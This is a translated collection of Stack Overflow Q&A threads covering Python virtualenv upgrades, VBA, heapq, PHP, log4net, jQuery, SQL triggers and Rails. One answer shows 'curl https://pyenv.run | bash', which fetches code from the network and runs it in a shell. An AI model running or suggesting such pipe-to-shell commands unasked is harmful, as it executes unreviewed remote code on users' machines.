**2.安装Python**

假设一个人没有 sudo 访问权限，[`pyenv`](https://github.com/pyenv/pyenv)这是一种可靠且快速的安装方式`Python`。为此，应该运行

```
$ curl https://pyenv.run | bash 
```

接着

```
$ exec $SHELL 
```

正如[这里所建议的那样](https://github.com/pyenv/pyenv-installer)。

如果，当一个人试图更新 pyenv

```
pyenv update 
```

一个得到错误

```
bash: pyenv: command not found 
```

这是因为 pyenv 路径没有导出到 .bashrc。可以通过执行以下命令来解决：

```
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n eval "$(pyenv init -)"\nfi' >> ~/.bashrc 
```

然后重启shell

```
exec "$SHELL" 
```

现在应该安装想要的 Python 版本。假设版本 3.8.3

```
pyenv install 3.8.3 
```

可以通过运行确认它是否已正确安装

```
pyenv versions 
```

输出应该是位置和版本（在本例中为 3.8.3）

**3.创建新的虚拟环境**

最后，安装新的 Python 版本，创建一个新的虚拟环境（我们称之为`venv`）

```
python3.8 -m venv venv 
```

激活它

```
source venv/bin/activate 
```

并安装要求

```
pip install -r requirements.txt 
```

现在应该在一个新的环境中启动并运行。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2018-04-09T17:02:46.307

如果您正在使用`pipenv`，我不知道是否可以就地升级环境，但至少对于次要版本升级，它似乎足够聪明，不会在创建新环境时从头开始重建包。例如，从 3.6.4 到 3.6.5：

```
$ pipenv --python 3.6.5 install
Virtualenv already exists!
Removing existing virtualenv…
Creating a v$ pipenv --python 3.6.5 install
Virtualenv already exists!
Removing existing virtualenv…
Creating a virtualenv for this project…
Using /usr/local/bin/python3.6m (3.6.5) to create virtualenv…
⠋Running virtualenv with interpreter /usr/local/bin/python3.6m
Using base prefix '/usr/local/Cellar/python/3.6.5/Frameworks/Python.framework/Versions/3.6'
New python executable in /Users/dmoles/.local/share/virtualenvs/autoscale-aBUhewiD/bin/python3.6
Also creating executable in /Users/dmoles/.local/share/virtualenvs/autoscale-aBUhewiD/bin/python
Installing setuptools, pip, wheel...done.

Virtualenv location: /Users/dmoles/.local/share/virtualenvs/autoscale-aBUhewiD
Installing dependencies from Pipfile.lock (84dd0e)…
     ▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉ 47/47 — 00:00:24
To activate this project's virtualenv, run the following:
 $ pipenv shell
$ pipenv shell
Spawning environment shell (/bin/bash). Use 'exit' to leave.
. /Users/dmoles/.local/share/virtualenvs/autoscale-aBUhewiD/bin/activate
bash-3.2$ . /Users/dmoles/.local/share/virtualenvs/autoscale-aBUhewiD/bin/activate
(autoscale-aBUhewiD) bash-3.2$ python
Python 3.6.5 (default, Mar 30 2018, 06:41:53) 
[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.39.2)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import numpy as np
>>> 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2017-07-20T19:00:16.243

我只是想澄清一下，因为有些答案是指`venv`，有些是指`virtualenv`.

在 上支持使用`-p`or`--python`标志`virtualenv`，但在 上不支持`venv`。如果您有多个 Python 版本，并且想要指定使用哪个版本创建`venv`，请在命令行上执行，如下所示：

```
malikarumi@Tetuoan2:~/Projects$ python3.6 -m venv {path to pre-existing dir you want venv in} 
```

正如其他人所指出的那样，您当然可以升级`venv`，但这假设您已经升级了最初用于创建它的 Python `venv`。您无法升级到系统上某个地方还没有的 Python 版本，因此请确保首先获得您想要的版本，然后从中制作您想要的所有 venv。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2015-06-17T09:32:35.247

我将我的主目录从一台 mac 移动到另一台（Mountain Lion 到 Yosemite），直到我失去了旧笔记本电脑时才意识到损坏的 virtualenv。我安装了指向 Python 2.7 的 virtualenv 点，`brew`并且由于 Yosemite 附带 Python 2.7，我想将我的 virtualenv 更新为系统 python。当我`virtualenv`在现有目录之上运行时，我遇到了`OSError: [Errno 17] File exists: '/Users/hdara/bin/python2.7/lib/python2.7/config'`错误。通过反复试验，我通过删除一些链接并手动修复一些链接来解决这个问题。这就是我最终所做的（类似于@Rockalite 所做的，但更简单）：

```
cd <virtualenv-root>
rm lib/python2.7/config
rm lib/python2.7/lib-dynload
rm include/python2.7
rm .Python
cd lib/python2.7
gfind . -type l -xtype l | while read f; do ln -s -f /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/${f#./} $f; done 
```

在此之后，我能够在现有目录之上运行 virtualenv。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2017-10-20T15:25:07.380

在使用 Homebrew 安装和升级 Python3 的 OS X 或 macOS 上，我必须先删除符号链接才能`python -m venv --upgrade ENV_DIR`工作。

我在 upgrade_python3.sh 中保存了以下内容，所以我会记得几个月后我需要再次执行此操作：

```
brew upgrade python3
find ~/.virtualenvs/ -type l -delete
find ~/.virtualenvs/ -type d -mindepth 1 -maxdepth 1 -exec python3 -m venv --upgrade "{}" \; 
```

更新：虽然起初这似乎运作良好，但当我运行 py.test 时，它给出了一个错误。最后，我只是从需求文件中重新创建了环境。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2018-11-23T11:44:49.943

对于每个有问题的人

> 错误：命令 '['/Users/me/Sites/site/venv3/bin/python3', '-Im', 'ensurepip', '--upgrade', '--default-pip']' 返回非零退出状态 1。

你必须安装 python3.6-venv

```
 sudo apt-get install python3.6-venv 
```

# sql-server - 如何从 VBA 中的函数返回 ADODB.Connection？

> ID：10218949
> 
> 赞同：4
> 
> 时间：2012-04-18T22:21:52.150
> 
> 标签：sql-server, ms-access, database-connection, vba, adodb

我有一个大型 Access VBA/SQL Server 应用程序。在每个函数中都有相同的 ADODB 连接。

如何用每次都可以调用的单个函数替换它们以节省空间。

```
Public Function ConnectionString() As ADODB.Connection
    Dim CN As ADODB.Connection

    Set CN = New ADODB.Connection

    With CN
        .Provider = "Microsoft.Access.OLEDB.10.0"
        .Properties("Data Provider").Value = "SQLOLEDB"
        .Properties("Data Source").Value = DLookup("Source", "tbl_Connection")
        .Properties("Initial Catalog").Value = DLookup("Catalog", "tbl_Connection")
        .Properties("Integrated Security").Value = SSPI
        .Open
    End With

    ConnectionString = CN

End Function 
```

似乎这应该返回该连接，但有一条错误消息：

> 未找到用户定义的函数

就行了`ConnectionString = CN`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:50:58.960

您需要`Set`返回值：

```
Set ConnectionString = CN 
```

* * *

另外，如果它始终是相同的 ADODB 连接，您可以将它保存在一个变量中并从那里“回收”它，因此连接的实际创建只发生一次（当`ConnectionString`第一次调用该函数时）。

```
Private CN As ADODB.Connection 'variable in the module - NOT in the function

Public Function ConnectionString() As ADODB.Connection

If CN Is Nothing Then

    Set CN = New ADODB.Connection

    With CN
        'do stuff
    End With

End If

Set ConnectionString = CN

End Function 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-01-19T16:05:57.393

```
From sub caller:
    Dim DBConnection As New ADODB.Connection
    Call getDBConnection(ServerInfo, DBConnection)
The sub called:

Public Sub getDBConnection(ByRef paramServerInfo As ConnState, ByRef pCN As ADODB.Connection)
    Dim flagConnect As Boolean
    Dim errConnect As String
    Dim optionConn As String
    Dim strConn As String

    optionConn = "16427"
    strConn = "Provider=MSDASQL.1;Persist Security Info=False;Extended Properties=""" & _
            "DRIVER={" & paramServerInfo.ODBC & "};" & _
            "DATABASE=" & paramServerInfo.Database & ";" & _
            "SERVER=" & paramServerInfo.Server & ";" & _
            "USER=" & paramServerInfo.UserName & ";" & _
            "PASSWORD=" & paramServerInfo.Password & ";" & _
            "Port=" & paramServerInfo.Port & ";" & _
            "OPTION=" & optionConn & ";"

    On Error Resume Next
    paramServerInfo.Conneted = False
    Do
        pCN.CursorLocation = adUseClient
        pCN.Open strConn
        paramServerInfo.Conneted = Not pCN Is Nothing
        paramServerInfo.LastMsg = Err.Description
        If Not paramServerInfo.Conneted Then
            If MsgBox("Existe un problema al intentar conectar con la Base de Datos" & vbCrLf & paramServerInfo.LastMsg & vbCrLf & "Por favor determine que hacer:", vbCritical + vbAbortRetryIgnore) = vbAbort Then
                Exit Sub
            End If
        End If
    Loop Until paramServerInfo.Conneted
End Sub 
```

# python - 使用python在优先级队列中打破平局

> ID：10218953
> 
> 赞同：9
> 
> 时间：2012-04-18T22:22:15.130
> 
> 标签：python, algorithm, priority-queue

我正在使用堆队列来实现算法，当我将新节点添加到队列中时，它们会按启发式函数排序：例如 heappush(queue, (score(node), node))，这太棒了，除了当我从队列中弹出下一个节点时，我想要最近添加的节点，而不是第一个添加的节点，这是 heappop 返回的。如何在不破坏队列的情况下将最新节点添加到队列中？

我想我可以从第一个元素开始迭代，当下一个元素的分数相同时，继续。然后，当我找到具有该分数的最后一个元素时，我选择它并将其从列表中删除。这显然不是很有效，并且打破了优先级队列的时间复杂度？

我被困在这个问题上，我想不出办法来做到这一点。

谢谢。

编辑; 按照建议使用计数器不起作用（也许我误解了）

```
>>> queue = []
>>> heappush(queue, (2, 0, 'a'))
>>> heappush(queue, (3, -1, 'b'))
>>> queue
[(2, 0, 'a'), (3, -1, 'b')]
>>> heappush(queue, (2, -2, 'c'))
>>> queue
[(2, -2, 'c'), (3, -1, 'b'), (2, 0, 'a')] 
```

现在队列的排序不正确，并且比 'a' 更糟糕的选项 'b' 被放置在它之前。

编辑2：

我勒个去？

```
>>> heappop(queue)
(2, -2, 'c')
>>> queue
[(2, 0, 'a'), (3, -1, 'b')]
>>> 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-18T22:30:09.683

一种非常简单的方法是添加一个包含时间戳或计数器值的中间项。例如：

```
>>> heap = []
>>> counter = itertools.count()
>>> for i in range(10):
...     heapq.heappush(heap, (i, -next(counter), str(i) + ' oldest'))
...     heapq.heappush(heap, (i, -next(counter), str(i) + ' newest'))
... 
>>> heapq.heappop(heap)
(0, -1, '0 newest')
>>> heapq.heappop(heap)
(0, 0, '0 oldest')
>>> heapq.heappop(heap)
(1, -3, '1 newest')
>>> heapq.heappop(heap)
(1, -2, '1 oldest') 
```

正如 agf 提到的，这是[`heapq`](http://docs.python.org/library/heapq.html#priority-queue-implementation-notes)文档使用的方法，仅使用负索引。（那里的实现还包括一个不错的任务删除和优先级更改例程。）

# php - PHP 5 中使用 mysql_query() 的调用是异步的吗？

> ID：10218959
> 
> 赞同：0
> 
> 时间：2012-04-18T22:22:42.423
> 
> 标签：php, mysql, web-services

这是一些示例数据库代码：

```
mysql_query("DELETE FROM table1 WHERE info1 = 'blah'");
mysql_query($personal_query); 
```

从理论上讲，第二行可以在第一行完成删除之前执行吗？如果是这样，我如何使代码不是异步的？在继续之前，我需要确保删除已完成。仅仅获得一个返回值就可以解决这个问题吗？

```
$result = mysql_query("DELETE FROM table1 WHERE info1 = 'blah'");
mysql_query($personal_query); 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T22:28:53.293

您正在寻找的是一种锁定行或整个表的方法。这应该会有所帮助：[http ://dev.mysql.com/doc/refman/5.5/en/locking-issues.html](http://dev.mysql.com/doc/refman/5.5/en/locking-issues.html)

您必须记住，当两个或多个用户在同一个表/行上工作时，通常会应用所谓的“竞争条件”。

**PS**您不应该使用古老的`mysql_*`功能编写任何新代码。它们不再被维护，社区已经开始[弃用它们](http://news.php.net/php.internals/53799)。相反，您应该学习如何将[PDO](http://php.net/pdo)或[MySQLi](http://php.net/mysqli)与[准备好的语句](http://php.net/manual/en/pdo.prepared-statements.php)一起使用。如果您决定使用 PDO，那么这里有一个很好的[教程](http://wiki.hashphp.org/PDO_Tutorial_for_MySQL_Developers)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T22:24:49.647

不，当然不是，它将按顺序运行，直到函数完成并返回才会继续

# iphone - 我想从我的 iPhone 向另一台 iPhone 发送通知

> ID：10218960
> 
> 赞同：3
> 
> 时间：2012-04-18T22:22:53.927
> 
> 标签：iphone, push-notification

在我开始之前，我意识到这个问题之前已经在这个论坛上提出过，因为我找到了这个帖子。然而，这个问题没有得到回答。

我正在构建一个使用 iPhone 作为工作机器的系统。我这样说是因为我想强调手机不是苹果的产品，而是一种能够或不能执行给定任务的设备。

我已经越狱了我正在使用的两部手机，并将专门使用它们来解决系统要解决的问题。我的系统将由我和我一个人使用，因此 Apple 打算如何使用这些设备、用户体验等问题与我无关。

好的，说了这么多，我将简要概述该系统。两部 iPhone，其中一部的内脏装在我前门上方的一个电子项目箱中，摄像头面向访客。其他 iPhone，完好无损，在我的口袋里。我已将引脚 1 和 11 连接到门铃按钮，并通过监控音频路由变化来提醒手机被按下。我需要在我的袖珍电话上安装一个应用程序，该应用程序将被门禁电话发送的通知唤醒。一旦我接受了袖珍电话上的通知，门电话也会发送图像。这里根本没有互联网，但是我确实有一个连接两部手机的wifi路由器。

这就是系统，我搜索了高低以找到可以帮助我让门电话生成推送通知并将其发送到我的袖珍电话的代码，到目前为止我发现的只是这个[https://github。 com/stefanhafeneger/PushMeBaby](https://github.com/stefanhafeneger/PushMeBaby)这是我只需要它是为 mac 而不是 iPhone 编写的，而且我是 Objective C 的新手，所以移植真的很难。

请有人帮我完成我想做的事情，我知道苹果不打算让我像我一样使用它的产品，但是很多制造商也没有，但爱好者仍然设法使用它们更多创造性和创新的方式。我目前正在使用 PC 和网络摄像头来查看谁在门口并且它使用大量电力，如果我能让它工作，新系统会好得多所以请如果你有能力/知识来提供帮助然后我发表回复，我将永远感激不尽。谢谢你，理查德。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T04:41:05.277

我想不出一种直接从一部手机向另一部手机发送消息的简单方法。（虽然我不习惯越狱的东西，所以谁知道......）。无论如何，这就是我要做的：

设置一个简单的 Web 服务器来连接两个设备。你说你没有互联网，所以只要在网络上的本地计算机上运行 Apache 或其他任何东西就可以了。每当您想发送消息时，发送电话都会向服务器发布一些内容。不幸的是，如果您不能/不想使用 Apple 的推送通知服务，我认为接收电话将不得不不断监控服务器以查看是否有任何新消息。:(

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-29T08:16:16.100

使用 GameKit 将手机与蓝牙配对。

这是一个关于如何蓝牙配对两部 iPhone 的问题：[如何使用蓝牙连接两部 iPhone？](https://stackoverflow.com/questions/1427250/how-to-use-bluetooth-to-connect-two-iphone)

最简单的方法是使用高度不透明的 GameKit。这是实现此目的的 Apple 示例应用程序：http: [//developer.apple.com/library/ios/#samplecode/GKTank/Introduction/Intro.html](http://developer.apple.com/library/ios/#samplecode/GKTank/Introduction/Intro.html)

从那个示例中，发送数据包的片段（在 TankViewController.m 中）：

```
- (void)sendNetworkPacket:(GKSession *)session packetID:(int)packetID withData:(void *)data ofLength:(int)length reliable:(BOOL)howtosend {
    // the packet we'll send is resued
    static unsigned char networkPacket[kMaxTankPacketSize];
    const unsigned int packetHeaderSize = 2 * sizeof(int); // we have two "ints" for our header

    if(length < (kMaxTankPacketSize - packetHeaderSize)) { // our networkPacket buffer size minus the size of the header info
        int *pIntData = (int *)&networkPacket[0];
        // header info
        pIntData[0] = gamePacketNumber++;
        pIntData[1] = packetID;
        // copy data in after the header
        memcpy( &networkPacket[packetHeaderSize], data, length ); 

        NSData *packet = [NSData dataWithBytes: networkPacket length: (length+8)];
        if(howtosend == YES) { 
            [session sendData:packet toPeers:[NSArray arrayWithObject:gamePeerId] withDataMode:GKSendDataReliable error:nil];
        } else {
            [session sendData:packet toPeers:[NSArray arrayWithObject:gamePeerId] withDataMode:GKSendDataUnreliable error:nil];
        }
    }
} 
```

# multithreading - log4net + 多线程 + 滚动文件追加器

> ID：10218962
> 
> 赞同：12
> 
> 时间：2012-04-18T22:22:57.430
> 
> 标签：multithreading, log4net, rollingfileappender

我在 log4net.config 中为 log4net 设置了这个设置，以允许多个线程写入同一个文件：

```
<appender name="LogFileAppender" type="log4net.Appender.RollingFileAppender">
    <!-- Minimal locking to allow multiple threads to write to the same file -->
    <lockingModel type="log4net.Appender.FileAppender+MinimalLock"/>
    <file value="log\UI.log"/>
    <appendToFile value="true"/>
    <rollingStyle value="Date"/>
    <maxSizeRollBackups value="30"/>
    <datePattern value="-yyyyMMdd"/>
    <layout type="log4net.Layout.PatternLayout">
        <conversionPattern value="%newline%date [%thread] %-5level [%property{identity}] %logger{3} - %message%newline"/>
    </layout>
</appender> 
```

但是在午夜之后，新创建的日志文件一直被覆盖，因此文件中只有最后一个事件。服务器重新启动后，一切都恢复正常，直到下一个午夜。
那么谁能说这是一个配置问题还是这只是一个 log4net 问题？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-28T09:31:11.660

由于我只有一个使用相同记录器的进程（IIS、w3wp.exe），因此通过删除锁定模型密钥解决了该问题。

```
<lockingModel type="log4net.Appender.FileAppender+MinimalLock"/> 
```

既然在[这里](http://logging.apache.org/log4net/release/faq.html)说：

> 如果您使用 RollingFileAppender，情况会变得更糟，因为多个进程可能会尝试同时开始滚动日志文件。RollingFileAppender 在滚动文件时完全忽略了锁定模型，滚动文件根本不兼容这种场景。

我想你会得到不可预测的结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T14:03:58.697

我的猜测是，您在 the 上使用 - 符号`datePattern`会混淆框架，因此在第一次滚动后，任何日志都会触发滚动事件。

当你尝试这个时会发生什么

```
<datePattern value="yyyyMMdd" /> 
```

[根据此处](http://logging.apache.org/log4net/release/config-examples.html)的示例。

> 要更改滚动周期，请调整 DatePattern 值。**例如，“yyyyMMdd”的日期模式将每天滚动。**有关可用模式的列表，请参阅 System.Globalization.DateTimeFormatInfo。

# c# - 继承的 Web API API 控制器

> ID：10218963
> 
> 赞同：8
> 
> 时间：2012-04-18T22:23:06.343
> 
> 标签：c#, asp.net-mvc-4, asp.net-web-api

我有几节课

```
Square : Rectangle : Shape (abstract) 
```

我有一个从 ApiController 继承的基本控制器，我想使用它。

```
public abstract class BaseController<T> : ApiController where T : class
{
    public abstract IEnumerable<T> Get()
    ...
} 
```

和

```
public class DerivedController : BaseController<Rectangle>
{
    public override IEnumerable<Rectangle> Get()
    ...
}

public class AnotherDerivedController : BaseController<Square>
{
    public new IEnumerable<Square> Get()
    ...
} 
```

/api/rectangle 将正确调用`IEnumerable<Rectangle> Get()`

/api/square 会给我一个错误：

```
Multiple actions were found that match the request: 
System.Linq.IEnumerable`1[Square] Get() on type Web.Api.Controllers.AnotherDerivedController 
System.Linq.IEnumerable`1[Rectangle] Get() on type Web.Api.Controllers.DerivedController 
```

如果我更改`public new IEnumerable<Square> Get()`为`public override IEnumerable<Square> Get()`，我会收到编译时错误，因为返回签名不同

如何让我的代码调用正确的方法？是否需要在 RegisterRoutes 中显式注册每个类的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:49:55.013

您需要覆盖 Get，您基本上是与`new`. 这是行不通的，因为该类将有两个 Get 方法，并且 Web API 会混淆选择哪一个。

您可以定义`BaseController`as`abstract`和`Get`as `virtual`or`abstract`然后在您的`DerivedController`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T14:21:05.490

您目前有两个控制器可以使用您的 square 类。你是如何注册你的路线的？如果您将控制器重命名为 rectangleController 和 SquareController ，您可能会没事的。

# jquery - iPhoto 喜欢使用 jQuery 进行图像预览吗？

> ID：10218967
> 
> 赞同：2
> 
> 时间：2012-04-18T22:23:26.973
> 
> 标签：jquery, image, preview

是否有一个 jQuery 插件可以像在 Apple iPhoto 中一样预览图像？（鼠标悬停在图像上，移动时显示不同的图像）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:24:32.417

我找到了这个：[https ://gist.github.com/188986](https://gist.github.com/188986)

# javascript - 不依赖 Canvas 的 Javascript 图像处理库

> ID：10218968
> 
> 赞同：0
> 
> 时间：2012-04-18T22:23:38.850
> 
> 标签：javascript, image-processing, web-worker

Javascript中是否有任何不依赖于画布的图像处理库，因此可以在网络工作者中使用？

我正在寻找对光栅图像的操作，例如缩放、旋转和裁剪。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T08:04:49.993

如果我没记错的话，Raphaël.js 也使用画布。

抱歉**，没有这样的库**独立于浏览器的画布工作。Javascript 本身不能操作图像。

如果您需要在客户端操作图像，您将不得不使用 js+ca​​nvas 或 flash（它有自己的绘图 api）。如果不可能...将您的操作逻辑移至服务器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-10-13T04:17:04.433

吉普。为节点编写，移植到浏览器。[https://github.com/oliver-moran/jimp/tree/master/packages/jimp/browser](https://github.com/oliver-moran/jimp/tree/master/packages/jimp/browser)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T22:34:14.853

试试拉斐尔 [http://raphaeljs.com/](http://raphaeljs.com/)

它适用于 SVG 和 VML，因此它支持广泛的浏览器。

# ios - 控制来自 3rd 方应用程序 ios 的背景音乐

> ID：10218979
> 
> 赞同：5
> 
> 时间：2012-04-18T22:24:36.450
> 
> 标签：ios, mpmusicplayercontroller

有没有办法控制当前在后台播放的音乐？我可以使用 控制本机 ipod 应用程序`MPMusicPlayerController iPodMusicPlayer`，但我基本上想要的是任务切换器中 ipod 控制器的功能。我希望能够控制当前正在播放的应用程序（下一个/上一个）。任务切换器中的控件控制 spotify、pandora 或当前正在播放的任何其他应用程序。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T00:39:25.373

你可以这样做。首先确保您使用的是 AVAudioSessionCategoryPlayback 音频会话。激活音频会话后，调用：

```
 [[UIApplication sharedApplication] beginReceivingRemoteControlEvents]; 
```

有关更多详细信息，请参见此处 [http://developer.apple.com/library/ios/#documentation/EventHandling/Conceptual/EventHandlingiPhoneOS/RemoteControl/RemoteControl.html](http://developer.apple.com/library/ios/#documentation/EventHandling/Conceptual/EventHandlingiPhoneOS/RemoteControl/RemoteControl.html)

# mysql - 更新 tbl SET 字段 = x WHERE 字段！= x？

> ID：10218983
> 
> 赞同：1
> 
> 时间：2012-04-18T22:24:59.547
> 
> 标签：mysql, sql

此查询是否有任何性能提升：

```
UPDATE tbl SET field = 1 WHERE field != 1 
```

超过这个

```
UPDATE tbl SET field = 1 
```

SQL 解析器是否已经知道他不需要更新已经是 field = 1 的行？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T22:28:16.020

该条件`field != 1`可能会使其更快，尤其是在大多数值已经为 1 的情况下。假设索引可用于优化，数据库引擎将能够避免在这种情况下检查大多数记录。

更重要的是，也许查询可能没有相同的结果。如果任何`field`值为 NULL，则第一个 UPDATE 语句将不会更新这些值。第二个查询会将 NULL 设置为`1`.

另一个（相当明显）它们不等效的情况是 UPDATE 触发器将为第二个查询（没有条件）的所有记录触发，但它们不会为跳过的行的第一个查询触发。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T22:27:19.357

如果只有几个字段是，那么添加子句`!= 1`肯定会提高性能。`WHERE`即使 MySQL 没有将值*写入*磁盘，它仍然需要查看每一行以查看是否需要写入它，但它肯定不会自己添加`WHERE`子句。

# c - 为 Linux 做贡献

> ID：10218985
> 
> 赞同：3
> 
> 时间：2012-04-18T22:25:22.957
> 
> 标签：c, linux, multithreading, kernel

我正在从 Windows 切换到 Linux 开发，并且非常喜欢它。为内核做出贡献的最佳方式是什么。我非常精通 C 和 C++，并且对为线程做贡献特别感兴趣。任何指针将不胜感激！

# sql - 在 SQL 中创建查询时需要一些帮助吗？

> ID：10218991
> 
> 赞同：1
> 
> 时间：2012-04-18T22:26:07.773
> 
> 标签：sql, postgresql, cascading-deletes, audit-logging

我有 6 张桌子：

```
 Staff ( StaffID, Name )
 Product ( ProductID, Name )
 Faq ( FaqID, Question, Answer, ProductID* )
 Customer (CustomerID, Name, Email)
 Ticket ( TicketID, Problem, Status, Priority, LoggedTime, CustomerID* , ProductID* )
 TicketUpdate ( TicketUpdateID, Message, UpdateTime, TicketID* , StaffID* ) 
```

要回答的问题：给定一个产品 ID，删除该产品的记录。删除产品后，所有相关的常见问题解答都可以保留在数据库中，但在 ProductID 字段中应该有一个空引用。但是，删除产品也应删除任何相关的票证及其更新。为了完整起见，已删除的工单及其更新应复制到一个审计表或一组维护产品、工单和更新的历史数据的表中。（提示：您将需要定义一个或多个附加表来维护此审计信息，并在删除产品时自动复制任何已删除的工单和工单更新）。您的审计表应记录请求删除的用户和删除操作的时间戳。

我创建了额外的维护审核表：

```
CREATE TABLE maintain_audit(
 TicketID INTEGER NOT NULL,
 TicketUpdateID INTEGER NOT NULL,
 Message VARCHAR(1000),
 mdate TIMESTAMP NOT NULL,
 muser VARCHAR(128),
 PRIMARY KEY (TicketID, TicketUpdateID)
  ); 
```

另外，我创建了 1 个函数和触发器：

```
 CREATE OR REPLACE FUNCTION maintain_audit()
      RETURNS TRIGGER AS $BODY$
      BEGIN
      INSERT INTO maintain_audit (TicketID,TicketUpdateID,Message,muser,mdate)
     (SELECT Ticket.ID,TicketUpdate.ID,Message,user,now() FROM Ticket, TicketUpdate WHERE             Ticket.ID=TicketUpdate.TicketID AND Ticket.ProductID = OLD.ID);
      RETURN OLD;
      END;
     $BODY$
      LANGUAGE plpgsql; 

 CREATE TRIGGER maintain_audit
     BEFORE DELETE
     ON Product
     FOR EACH ROW
     EXECUTE PROCEDURE maintain_audit()

     DELETE FROM Product WHERE Product.ID=30; 
```

当我运行这一切时，我得到了这个：

```
 ERROR:  null value in column "productid" violates not-null constraint
   CONTEXT:  SQL statement "UPDATE ONLY "public"."faq" SET "productid" = NULL WHERE $1     OPERATOR(pg_catalog.=) "productid"" 
```

伙计们，你能帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T22:47:58.170

您可能想要的是触发器。不确定您使用的是什么 RDBMS，但这就是您应该开始的地方。我从零开始，并在一个小时内启动并在类似的情况下运行触发器。

如果您还不知道，触发器会在表上发生特定类型的查询后执行某些操作，例如插入、更新或删除。您可以执行任何类型的查询。

我要给您的另一个提示是不要删除任何内容，因为这可能会破坏数据完整性。您可以只添加一个“活动”布尔字段，将活动设置为 false，然后在系统的大多数查询中将其过滤掉。或者，您可以将关联的记录移出到具有相同结构的 Products_archive 表中。易于操作：

```
select * into destination from source where 1=0 
```

尽管如此，我还是会使用触发器完成您需要完成的工作，因为它们是如此自动。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T23:01:02.830

1.  为 Ticket.product_id 和具有 ON DELETE CASCADE 的 TicketUpdate.Ticket_id 创建外键。当您删除产品时，这将自动删除所有票证和票证更新。

2.  使用 product_id、用户和时间戳为产品删除器创建一个审计表。工单的审计表，ticketUpdate 应该准确地反映它们。

3.  为表 Ticket 创建一个 BEFORE DELETE TRIGGER，它将票证复制到审计表。

4.  对 TicketUpdate 执行相同的操作

5.  在产品上创建一个 AFTER DETETE 触发器，以捕获谁请求在产品审计表中删除产品。

6.  在表常见问题解答中，使用 ON DELETE SET NULL 创建 Product_id 作为外键

# jquery - JQuery 将事件绑定到集合项

> ID：10218992
> 
> 赞同：1
> 
> 时间：2012-04-18T22:26:09.893
> 
> 标签：jquery

我能够使用 JQuery 将事件绑定到集合的所有元素。无论如何，如果我只想选择集合中的一项，则不会绑定任何事件。在接下来的代码片段中一定有一个错误。提前致谢！

```
var divs = jQuery('.elternklasse').get(0).bind('click', function(){
    alert('Bin da');
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:27:59.847

使用`eq()`：

```
var divs = jQuery('.elternklasse').eq(0).bind('click', function(){
    alert('Bin da');
}); 
```

[JS 小提琴演示](http://jsfiddle.net/4n2ab/)。

要将事件附加到特定范围的元素，您可以使用`:gt()`or `:lt()`：

```
var divs = $('div:gt(3)').bind('click', function(){
    alert('Bin da');
});​ 
```

[JS 小提琴演示](http://jsfiddle.net/4n2ab/2/)。

```
var divs = $('div:lt(3)').bind('click', function(){
    alert('Bin da');
});​ 
```

[JS 小提琴演示](http://jsfiddle.net/4n2ab/3/)。

或者要将事件附加到元素数组中两个已知点之间的任意元素范围，请使用`slice()`：

```
var divs = $('div').slice(3,6).bind('click', function(){
    alert('Bin da');
});​ 
```

[JS 小提琴演示](http://jsfiddle.net/4n2ab/4/)。

以上将触发从索引点 3 到但*不包括*6 的元素的点击事件。

参考：

*   [`eq()`](http://api.jquery.com/eq/).
*   [`:gt()`大于选择器](http://api.jquery.com/gt-selector/)。
*   [`:lt()`小于选择器](http://api.jquery.com/lt-selector/)。
*   [`slice()`](http://api.jquery.com/slice/).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T22:29:03.590

该`.get()`函数返回实际的 DOM 元素，而不是 jQuery 对象，因此您不能在其上调用 jQuery 函数。您需要改用该[`.eq()`](http://api.jquery.com/eq/)函数，这会将集合减少为仅该位置的元素。

# ruby-on-rails - 为控制器切换资产主机

> ID：10218998
> 
> 赞同：12
> 
> 时间：2012-04-18T22:26:23.450
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1

试图找出一种在某个控制器访问时更改资产主机的方法。

控制器要严格使用https协议访问，所以需要将资产主机切换到使用https。目前，资产主机设置为链接到 S3 的 CNAME 子域，并且没有与之关联的 SSL 证书。我想要实现的是将当前资产主机替换为 https Amazon S3 URL。我担心的唯一资产是 CSS 和 JS 包括在内。

我正在考虑使用帮助程序从 stylesheet_link_tag 和 javascript_include_tag 中剥离主机，并将它们替换为 https Amazon S3 url。不过对我来说似乎有点骇人听闻。

或者如果 request.ssl 有办法改变资产主机？是真的？

我正在使用 Rails 3.2.x。

* * *

